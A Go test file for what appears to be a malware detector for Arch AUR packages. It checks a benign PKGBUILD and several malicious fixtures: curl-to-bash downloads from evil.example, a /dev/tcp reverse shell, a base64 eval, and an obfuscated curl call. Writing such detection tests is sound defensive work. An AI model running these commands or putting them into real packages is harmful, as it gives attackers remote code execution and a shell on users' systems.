package detect

import (
	"strings"
	"testing"
)

// TestAllPatternsCompile asserts every rule in patterns.toml is RE2-compatible.
func TestAllPatternsCompile(t *testing.T) {
	skipped := SkippedPatterns()
	if len(skipped) > 0 {
		t.Fatalf("patterns.toml has %d RE2-incompatible rules: %v", len(skipped), skipped)
	}
	total := 0
	for _, ps := range patternsBySection {
		total += len(ps)
	}
	if total < 200 {
		t.Fatalf("expected 200+ compiled pattern rules, got %d", total)
	}
}

func ids(fs []Finding) []string {
	out := make([]string, 0, len(fs))
	for _, f := range fs {
		out = append(out, f.ID)
	}
	return out
}

func has(fs []Finding, id string) bool {
	for _, f := range fs {
		if f.ID == id {
			return true
		}
	}
	return false
}

const benignPKGBUILD = `
pkgname=yabsnap
pkgver=1.2.3
pkgrel=1
pkgdesc="A btrfs snapshot tool"
arch=('any')
url="https://github.com/hirak99/yabsnap"
license=('Apache')
depends=('python' 'btrfs-progs')
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/hirak99/yabsnap/archive/v${pkgver}.tar.gz")
sha256sums=('abc123def456abc123def456abc123def456abc123def456abc123def456abc1')

build() {
    cd "$pkgname-$pkgver"
    make
}

package() {
    install -Dm755 yabsnap "${pkgdir}/usr/bin/yabsnap"
}
`

func TestBenignPKGBUILDNoEvidence(t *testing.T) {
	ctx := &PackageContext{
		Name:            "yabsnap",
		PkgbuildContent: benignPKGBUILD,
		Meta:            &AurMeta{Name: "yabsnap", NumVotes: 50, Popularity: 3.2, Maintainer: "hirak99", Submitter: "hirak99", URL: "https://github.com/hirak99/yabsnap", License: []string{"Apache"}},
	}
	f := Detect(ctx)
	if IsMalicious(f) {
		t.Fatalf("benign PKGBUILD flagged malicious; evidence=%v", ids(Evidence(f)))
	}
}

func TestMaliciousCurlPipeBash(t *testing.T) {
	ctx := &PackageContext{
		Name:            "evil",
		PkgbuildContent: "build() {\n  curl -s https://evil.example/x | bash\n}",
	}
	f := Detect(ctx)
	if !IsMalicious(f) {
		t.Fatalf("curl|bash not flagged; findings=%v", ids(f))
	}
	if !has(f, "P-CURL-PIPE") {
		t.Errorf("expected P-CURL-PIPE, got %v", ids(f))
	}
}

func TestMaliciousReverseShell(t *testing.T) {
	ctx := &PackageContext{Name: "evil", PkgbuildContent: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}
	f := Detect(ctx)
	if !has(f, "P-REVSHELL-DEVTCP") || !IsMalicious(f) {
		t.Fatalf("reverse shell not flagged; findings=%v", ids(f))
	}
}

func TestMaliciousBase64Eval(t *testing.T) {
	ctx := &PackageContext{Name: "evil", PkgbuildContent: "eval $(echo payload | base64 -d)"}
	f := Detect(ctx)
	if !has(f, "P-EVAL-BASE64") {
		t.Fatalf("base64|eval not flagged; findings=%v", ids(f))
	}
}

func TestInstallScriptDownloadExec(t *testing.T) {
	ctx := &PackageContext{
		Name:                 "evil",
		InstallScriptContent: "post_install() {\n  curl -s https://evil.example/x | sh\n}",
	}
	f := Detect(ctx)
	if !IsMalicious(f) {
		t.Fatalf("install-script download-exec not flagged; findings=%v", ids(f))
	}
	found := false
	for _, id := range ids(f) {
		if strings.Contains(id, "INSTALL") || strings.HasPrefix(id, "IS-") || id == "P-CURL-PIPE" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected an install-script evidence id, got %v", ids(f))
	}
}

func TestShellVarConcatExec(t *testing.T) {
	ctx := &PackageContext{Name: "evil", PkgbuildContent: "a=cu\nb=rl\n$a$b http://evil.example | bash"}
	f := Detect(ctx)
	if !has(f, "SA-VAR-CONCAT-EXEC") {
		t.Fatalf("var-concat exec not flagged; findings=%v", ids(f))
	}
}

func TestTyposquatIsEvidence(t *testing.T) {
	ctx := &PackageContext{Name: "pary", Meta: &AurMeta{Name: "pary", NumVotes: 0}}
	f := Detect(ctx)
	if !has(f, "B-TYPOSQUAT") || !IsMalicious(f) {
		t.Fatalf("typosquat not flagged as evidence; findings=%v", ids(f))
	}
}

func TestReputationOnlyIsContextNotMalicious(t *testing.T) {
	// Zero votes / no license / no url alone must NOT mint.
	ctx := &PackageContext{
		Name:            "my-obscure-tool",
		PkgbuildContent: benignPKGBUILD,
		Meta:            &AurMeta{Name: "my-obscure-tool", NumVotes: 0, Popularity: 0, Maintainer: "", URL: "", License: nil},
	}
	f := Detect(ctx)
	if IsMalicious(f) {
		t.Fatalf("reputation-only signals must not mark malicious; evidence=%v", ids(Evidence(f)))
	}
	if len(Context(f)) == 0 {
		t.Errorf("expected context findings for low-reputation package")
	}
}
